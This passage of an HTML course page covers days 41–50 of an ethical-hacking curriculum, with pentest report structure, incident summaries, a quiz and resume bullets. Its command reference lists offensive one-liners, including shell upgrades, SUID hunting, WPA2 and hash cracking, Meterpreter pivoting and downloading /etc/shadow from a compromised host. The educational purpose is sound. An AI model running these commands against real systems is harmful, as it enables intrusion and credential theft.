+    <p style="font-size:13.5px;color:#cdd6da;"><strong>Colonial Pipeline (May 2021):</strong> DarkSide attackers compromised a VPN credential (no MFA), accessed the IT network, then pivoted to OT systems managing pipeline operations. The $4.4M ransom was paid because critical infrastructure was reachable from the initial foothold. Network segmentation + MFA would have blocked the pivot.</p>
+  </div>
+
+  <!-- DAY 50 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num">50</div>
+      <div class="day-meta">
+        <div class="day-title">Writing Your First Pentest Report</div>
+        <span class="day-incident">PTES / OWASP Standards</span>
+      </div>
+    </div>
+
+    <div class="section-label">// report structure</div>
+    <div class="concept-grid">
+      <div class="concept"><div class="ctitle">Executive Summary</div><div class="cdesc">1-page for non-technical stakeholders. Overall risk rating, business impact, # of findings by severity. No jargon.</div></div>
+      <div class="concept"><div class="ctitle">Methodology</div><div class="cdesc">Scope, tools used, testing approach. Follows PTES or OWASP Testing Guide structure for credibility.</div></div>
+      <div class="concept"><div class="ctitle">Findings</div><div class="cdesc">Per-vulnerability: CVSS score, description, proof-of-concept screenshot, affected assets, remediation steps.</div></div>
+      <div class="concept"><div class="ctitle">Remediation Summary</div><div class="cdesc">Prioritized action items ranked by risk reduction per effort. What to fix first, what can wait.</div></div>
+    </div>
+
+    <div class="section-label">// commands</div>
+    <div class="command-table">
+      <div class="cmd-row"><code>CVSS 3.1 Calculator — nvd.nist.gov/vuln-metrics/cvss</code><div class="cdesc">Score each finding 0-10. AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = Critical 9.8</div></div>
+      <div class="cmd-row"><code>screenshot - clipboard + markup</code><div class="cdesc">Every finding needs a screenshot PoC. Mark up with arrows/boxes showing exactly where the vulnerability was triggered.</div></div>
+      <div class="cmd-row"><code>pandoc report.md -o report.pdf</code><div class="cdesc">Convert markdown report to PDF. Keep source in markdown, deliver in PDF.</div></div>
+      <div class="cmd-row"><code>tar -czf report_$(date +%Y%m%d).tar.gz report.pdf screenshots/</code><div class="cdesc">Archive and timestamp the deliverable. Version control matters.</div></div>
+    </div>
+
+    <div class="section-label">// key rule</div>
+    <p style="font-size:13.5px;color:#cdd6da;">The report is the deliverable, not the exploitation. A perfect exploit chain with a poorly written report gets ignored. A well-written report with a moderate finding gets fixed. Write for the CISO who reads the exec summary, not the engineer who reads the technical details.</p>
+  </div>
+
+  <!-- ALL REAL INCIDENTS TIMELINE -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--red);">⚠</div>
+      <div class="day-meta">
+        <div class="day-title">All 10 Real Incidents — Quick Reference</div>
+        <span class="day-incident">Know these cold — they appear in every interview</span>
+      </div>
+    </div>
+    <div class="breach-timeline">
+      <div class="bt-row"><div class="year">2012/16</div><div class="incident">LinkedIn Breach</div><div class="detail">167M unsalted SHA-1 hashes. 90% cracked via Hashcat in days. Salting is mandatory.</div></div>
+      <div class="bt-row"><div class="year">2017</div><div class="incident">Equifax (Metasploit)</div><div class="detail">Apache Struts CVE-2017-5638 exploited via public Metasploit module. 147M records exposed.</div></div>
+      <div class="bt-row"><div class="year">2017</div><div class="incident">Krack WPA2</div><div class="detail">Protocol-level WPA2 flaw. Decrypt traffic, inject malware without knowing password. Protocol flaws > password strength.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">PrintNightmare</div><div class="detail">Windows Print Spooler RCE (CVE-2021-34527). SYSTEM-level code execution widely exploited in ransomware.</div></div>
+      <div class="bt-row"><div class="year">2021</div><div class="incident">Colonial Pipeline</div><div class="detail">DarkSide via VPN → IT → OT pivot. $4.4M ransom. Network segmentation + MFA would have stopped it.</div></div>
+      <div class="bt-row"><div class="year">2022</div><div class="incident">Dirty Pipe (CVE-2022-0847)</div><div class="detail">Linux kernel pipe bug. Overwrite read-only files including SUID binaries. Kernel 5.8+ affected.</div></div>
+      <div class="bt-row"><div class="year">Ongoing</div><div class="incident">Metasploitable Training</div><div class="detail">Most downloaded intentionally vulnerable VM. University standard for ethical hacking education.</div></div>
+      <div class="bt-row"><div class="year">Ongoing</div><div class="incident">Burp Suite in Bug Bounties</div><div class="detail">80% of professional bounty hunters cite Burp as primary web testing tool. IDOR hunting standard.</div></div>
+      <div class="bt-row"><div class="year">Ongoing</div><div class="incident">DVWA in Research</div><div class="detail">Referenced in 500+ academic papers. Standard platform for web vulnerability education.</div></div>
+      <div class="bt-row"><div class="year">Ongoing</div><div class="incident">PTES/OWASP Standards</div><div class="detail">Penetration Testing Execution Standard + OWASP Testing Guide — global frameworks for pentest deliverables.</div></div>
+    </div>
+  </div>
+
+  <!-- ALL COMMANDS QUICK REF -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--cyan);">&gt;_</div>
+      <div class="day-meta">
+        <div class="day-title">Master Command Reference — Days 41–50</div>
+        <span class="day-incident">Run these until they're muscle memory</span>
+      </div>
+    </div>
+    <div class="command-table">
+      <div class="cmd-row"><code>nmap -sV -sC -p- 192.168.1.10</code><div class="cdesc">Full port scan with version and default scripts — start every engagement here.</div></div>
+      <div class="cmd-row"><code>msfconsole</code><div class="cdesc">Launch Metasploit. Then: search, use, set RHOSTS, run.</div></div>
+      <div class="cmd-row"><code>python -c 'import pty;pty.spawn("/bin/bash")'</code><div class="cdesc">Upgrade limited shell to full TTY with tab completion.</div></div>
+      <div class="cmd-row"><code>find / -perm -4000 -type f 2>/dev/null</code><div class="cdesc">Find all SUID binaries — first check in Linux privesc.</div></div>
+      <div class="cmd-row"><code>sudo -l</code><div class="cdesc">List sudo privileges — one (ALL) entry = game over.</div></div>
+      <div class="cmd-row"><code>whoami /priv</code><div class="cdesc">Windows: list all privileges. Check for SeImpersonatePrivilege.</div></div>
+      <div class="cmd-row"><code>wmic service get name,pathname,startname</code><div class="cdesc">Windows: list services and find unquoted paths.</div></div>
+      <div class="cmd-row"><code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code><div class="cdesc">Crack MD5 hashes with dictionary attack.</div></div>
+      <div class="cmd-row"><code>aircrack-ng -w wordlist.txt capture-01.cap</code><div class="cdesc">Crack WPA2 handshake offline — post-deauth capture.</div></div>
+      <div class="cmd-row"><code>run autoroute -s 10.10.10.0/24</code><div class="cdesc">Meterpreter: pivot to internal network through compromised host.</div></div>
+      <div class="cmd-row"><code>proxychains nmap -sT 10.10.10.0/24</code><div class="cdesc">Run nmap through SOCKS proxy tunnel.</div></div>
+      <div class="cmd-row"><code>download /etc/shadow</code><div class="cdesc">Meterpreter: exfiltrate files from compromised host.</div></div>
+      <div class="cmd-row"><code>./linpeas.sh</code><div class="cdesc">Automated Linux privesc enumeration — runs every check at once.</div></div>
+      <div class="cmd-row"><code>./winPEAS.exe</code><div class="cdesc">Windows privesc enumeration — service, token, reg, path checks.</div></div>
+    </div>
+  </div>
+
+  <!-- AI TOOLS ACROSS DAYS 41-50 -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--pink);">AI</div>
+      <div class="day-meta">
+        <div class="day-title">AI Tools Referenced — Days 41–50</div>
+        <span class="day-incident">Use these alongside your learning</span>
+      </div>
+    </div>
+    <div class="ai-grid">
+      <div class="ai-pill"><div class="aname">ChatGPT / Claude</div><div class="adesc">Explain exploit chains, debug Metasploit config errors, generate CVSS rationale, review report drafts.</div></div>
+      <div class="ai-pill"><div class="aname">Copilot / Cursor</div><div class="adesc">Auto-complete Python privesc scripts and custom Metasploit modules. Faster exploit prototyping.</div></div>
+      <div class="ai-pill"><div class="aname">Nmap + GPT</div><div class="adesc">Paste scan output: "What services here are misconfigured or outdated?" AI identifies exploit paths.</div></div>
+      <div class="ai-pill"><div class="aname">Hashcat + AI</div><div class="adesc">AI-generated rule chains based on password policy (e.g., "must have 1 upper, 1 digit"). Optimizes cracking strategy.</div></div>
+      <div class="ai-pill"><div class="aname">Burp Suite + AI</div><div class="adesc">AI plugin auto-generates Intruder payload positions from intercepted requests. Speeds up parameter fuzzing.</div></div>
+      <div class="ai-pill"><div class="aname">CVSS GPT</div><div class="adesc">Describe a vulnerability, get the exact CVSS 3.1 vector string and score. Avoids calculator errors in reports.</div></div>
+    </div>
+  </div>
+
+  <!-- RESUME BULLETS -->
+  <div class="day-card">
+    <div class="day-header">
+      <div class="day-num" style="font-size:18px;color:var(--green);">💼</div>
+      <div class="day-meta">
+        <div class="day-title">Resume Bullets — Days 41–50</div>
+        <span class="day-incident">Lift these directly into your resume now</span>
+      </div>
+    </div>
+    <div class="job-grid">
+      <div class="job-box"><div class="day-ref">Day 41-42</div><div class="bullet">"Deployed and exploited Metasploitable 2 VM using Metasploit framework; chained Nmap reconnaissance, SMB/usermap exploitation, and Linux privilege escalation in a complete penetration testing workflow."</div></div>
+      <div class="job-box"><div class="day-ref">Day 43</div><div class="bullet">"Configured Burp Suite Community for web application testing; performed proxy interception, parameter fuzzing with Intruder, and manual request modification to identify IDOR and parameter tampering flaws."</div></div>
+      <div class="job-box"><div class="day-ref">Day 44</div><div class="bullet">"Exploited SQL injection, stored/reflected XSS, CSRF, and file upload vulnerabilities in DVWA across multiple security levels; authored corresponding mitigation patches for each vulnerability class."</div></div>
+      <div class="job-box"><div class="day-ref">Day 45-46</div><div class="bullet">"Performed Linux privilege escalation via SUID abuse, cron job manipulation, and kernel exploit matching; executed Windows privesc using service misconfigurations, token impersonation, and AlwaysInstallElevated."</div></div>
+      <div class="job-box"><div class="day-ref">Day 47</div><div class="bullet">"Cracked MD5, NTLM, and bcrypt hashes using Hashcat with GPU acceleration and rule-based mutation attacks; analyzed password complexity and hash salting effectiveness against dictionary and mask attacks."</div></div>
+      <div class="job-box"><div class="day-ref">Day 48</div><div class="bullet">"Captured WPA2 4-way handshakes using Aircrack-ng suite; performed deauthentication attacks and offline PSK cracking, demonstrating wireless network security vulnerabilities."</div></div>
+      <div class="job-box"><div class="day-ref">Day 49</div><div class="bullet">"Established lateral movement through compromised hosts using Meterpreter autoroute and SOCKS proxying; performed SSH dynamic port forwarding for internal network reconnaissance."</div></div>
+      <div class="job-box"><div class="day-ref">Day 50</div><div class="bullet">"Authored professional penetration test reports including CVSS-scored findings, executive summaries, PoC documentation, and prioritized remediation plans following PTES methodology."</div></div>
+    </div>
+  </div>
+
+  <!-- QUICK QUIZ -->
+  <div class="quiz-section">
+    <h2>// Quick Self-Quiz — Can You Answer These Without Looking?</h2>
+    <p class="sub">Cover the answers. Say them out loud. If you can't answer one fluently, revisit that day before continuing.</p>
+
+    <div class="q-item">
+      <div class="qnum">Q01</div>
+      <div class="qtext">What is the difference between a staged and stageless Metasploit payload?</div>
+      <div class="ans">Staged sends a small stub that fetches the larger stage (good for small buffers). Stageless is fully self-contained (more reliable, needs more space). Named with underscore: meterpreter_reverse_tcp vs meterpreter/reverse_tcp.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q02</div>
+      <div class="qtext">How did Metasploit play a role in the 2017 Equifax data breach?</div>
+      <div class="ans">Attackers used publicly available Metasploit modules targeting Apache Struts CVE-2017-5638. The same open-source exploitation framework used by defenders was weaponized against a Fortune 500 company.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q03</div>
+      <div class="qtext">How would you find an IDOR vulnerability using Burp Suite?</div>
+      <div class="ans">Proxy-intercept a request like /api/user/123, send to Intruder, mark the ID (123) as payload position, iterate through sequential values. If the response for 124 returns another user's data without authorization, it's an IDOR.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q04</div>
+      <div class="qtext">Name four Linux privilege escalation vectors you would check immediately.</div>
+      <div class="ans">SUID binaries (find / -perm -4000), sudo permissions (sudo -l), writable cron scripts (crontab -l, ls -la /etc/cron*), kernel exploits (uname -a → search for matching exploit).</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q05</div>
+      <div class="qtext">What does SeImpersonatePrivilege allow on Windows, and how is it exploited?</div>
+      <div class="ans">Allows a process to impersonate a security principal (like SYSTEM). Exploited using tools like RogueWinRM or JuicyPotato to create a process with SYSTEM's token through COM/DCOM interfaces.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q06</div>
+      <div class="qtext">Why did the LinkedIn 2012 breach allow 90% of passwords to be cracked within days?</div>
+      <div class="ans">Passwords were hashed with unsalted SHA-1. No salt means identical passwords produce identical hashes. GPU-based Hashcat cracked 167M hashes at billions per second. bcrypt or Argon2id with a per-user salt would have reduced the crack rate to near zero.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q07</div>
+      <div class="qtext">What is the WPA2 4-way handshake, and how do you capture it to crack offline?</div>
+      <div class="ans">The 4-way handshake is the authentication exchange between client and AP. Use airodump-ng to monitor, aireplay-ng to send deauth packets forcing reconnection, capture the handshake to a .cap file, then crack with aircrack-ng -w wordlist capture.cap.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q08</div>
+      <div class="qtext">Explain the Colonial Pipeline attack in terms of pivoting and lateral movement.</div>
+      <div class="ans">DarkSide compromised a VPN credential (no MFA), gaining initial access to the IT network. They then pivoted through the network to reach OT systems managing pipeline operations — a lateral movement from IT to OT. Network segmentation between IT and OT would have prevented the pivot.</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q09</div>
+      <div class="qtext">What four sections does every professional pentest report need?</div>
+      <div class="ans">Executive Summary (non-technical, 1 page), Methodology (scope, tools, approach), Findings (per-vuln: CVSS, PoC screenshot, remediation), Remediation Summary (prioritized fix list).</div>
+    </div>
+    <div class="q-item">
+      <div class="qnum">Q10</div>
+      <div class="qtext">What was Dirty Pipe (CVE-2022-0847) and why was it significant?</div>
+      <div class="ans">A Linux kernel vulnerability in the pipe mechanism (kernel 5.8+) that let unprivileged users overwrite read-only files including SUID binaries. Affected millions of Android devices, cloud servers, and embedded systems. PoC released within 48 hours of disclosure.</div>
+    </div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">// next up — day 51</div>
+      <div class="title">Intro to TryHackMe / HackTheBox — CTF platforms & methodology</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>revision complete — say "Day 51" when you're ready to continue.</footer>
+
+</div>
+</body>
+</html>
